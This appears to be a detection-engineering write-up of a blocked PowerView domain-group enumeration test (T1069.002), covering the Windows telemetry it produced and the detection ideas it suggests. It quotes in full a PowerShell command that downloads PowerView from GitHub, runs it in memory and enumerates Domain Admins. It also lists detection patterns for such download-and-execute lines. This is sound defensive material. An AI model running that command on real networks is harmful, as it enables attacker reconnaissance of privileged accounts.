# T1069.002-12: Domain Groups — Get-DomainGroupMember with PowerView

## Technique Context

T1069.002 (Domain Groups) involves adversaries enumerating domain group membership to understand privilege relationships and access patterns within Active Directory environments. This technique is fundamental to post-compromise reconnaissance, helping attackers identify high-value targets like Domain Admins, Enterprise Admins, and other privileged groups. PowerView's `Get-DomainGroupMember` function is a popular tool for this enumeration, providing detailed group membership information through LDAP queries. Detection engineers focus on identifying PowerShell execution that downloads and invokes PowerView, along with the characteristic network patterns and process behaviors associated with Active Directory enumeration.

## What This Dataset Contains

This dataset captures a PowerView-based domain group enumeration that was blocked by Windows Defender. The key evidence is in Security event 4688, which shows the PowerShell command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"}`. This command attempts to download PowerView from GitHub and immediately execute `Get-DomainGroupMember` against the "Domain Admins" group.

The telemetry shows the PowerShell process (PID 12892) was terminated with exit status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution. Sysmon captured the process creation, multiple .NET framework DLL loads, Windows Defender module loads (MpOAV.dll, MpClient.dll), and urlmon.dll loading (indicating web request preparation). A whoami.exe process was also spawned, likely as part of the test framework verification.

## What This Dataset Does Not Contain

Since Windows Defender blocked the PowerView execution, this dataset lacks the successful enumeration telemetry that would normally be present. There are no LDAP queries to domain controllers, no network connections to Active Directory services, and no PowerShell script block logging of the actual PowerView functions. The PowerShell channel contains only framework boilerplate and Set-ExecutionPolicy commands rather than the PowerView script content. Additionally, because the technique was blocked early, there's no evidence of the domain group membership results that would typically be displayed or logged.

## Assessment

This dataset provides excellent detection opportunities for PowerView download attempts and similar offensive PowerShell frameworks, but limited insight into successful domain enumeration behaviors. The Security 4688 events with command-line logging are the primary detection value, clearly capturing the malicious intent and technique indicators. The Sysmon events provide supporting context about process behavior and DLL loading patterns that could supplement detections. While the blocked execution limits the dataset's utility for detecting successful enumeration, it perfectly demonstrates how endpoint protection creates detectable "attempt" telemetry even when preventing technique completion.

## Detection Opportunities Present in This Data

1. **PowerView Download Pattern**: Detect PowerShell command lines containing `IEX (IWR` followed by PowerSploit/PowerView GitHub URLs in Security 4688 events
2. **PowerView Function Invocation**: Hunt for `Get-DomainGroupMember` function calls in PowerShell command lines, particularly when combined with web download patterns
3. **Suspicious PowerShell with Network Access**: Correlate PowerShell processes loading urlmon.dll (Sysmon EID 7) with web request patterns
4. **Framework Download and Execute**: Detect single command lines that both download remote PowerShell scripts and execute specific functions from those frameworks
5. **Blocked Execution with Access Denied**: Monitor for PowerShell processes terminating with exit code 0xC0000022 as potential indicators of blocked offensive tools
6. **PowerShell TLS Configuration**: Identify PowerShell commands setting SecurityProtocol to Tls12 as potential preparation for downloading remote payloads
7. **Domain Admin Group Targeting**: Alert on any PowerShell activity specifically referencing "Domain Admins" group enumeration attempts
